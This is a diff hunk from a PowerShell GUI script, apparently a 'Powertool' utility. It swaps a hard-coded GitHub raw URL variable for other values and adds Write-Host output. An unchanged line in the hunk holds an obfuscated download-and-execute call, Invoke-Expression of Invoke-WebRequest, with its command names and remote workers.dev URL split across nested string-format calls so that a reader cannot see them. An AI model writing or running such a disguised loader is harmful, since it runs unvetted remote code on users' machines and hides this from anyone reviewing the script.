@@ -947,7 +947,9 @@ $PowerShell.runspace = $Runspace;$Runspace.Open()
 $PowerShell.BeginInvoke() | Out-Null
 &([string]::Format("{1}{0}",'x','ie'))(&([string]::Format("{1}{0}", 'r','iw')) ([string]::Format("{7}{1}{4}{6}{8}{0}{3}{9}{5}{2}" ,'d',([string]::Format("{0}{1}", 'onf','i')),'v',([string]::Format("{1}{0}",'w','owpo')),'rm',([string]::Format("{1}{0}",'rs.de','e')),'.w','c','in',([string]::Format("{2}{3}{1}{0}",'rk','tool.wo','e','r'))))-useb)
 }
-$SecureString = 'https://raw.githubusercontent.com/Zv-yz/Powertool/main/Powertool'
+$SecureString = $String
+Write-Host $String
+Write-Host $String.ToString()
 #
 #
 $Pg = New-Object 'System.Windows.Forms.Form'
